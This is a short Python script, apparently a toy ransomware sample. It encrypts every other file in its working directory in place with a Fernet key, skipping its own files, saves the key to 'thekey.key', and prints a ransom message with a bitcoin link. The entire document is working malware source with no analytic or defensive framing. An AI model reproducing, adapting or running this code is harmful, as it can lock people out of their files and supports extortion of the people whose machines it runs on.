import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "society.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    # append those files that u stored in for loop to Array called files
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
print("You have been hacked! bitcoin link: https://bit.bit1231asdSADJH.com")
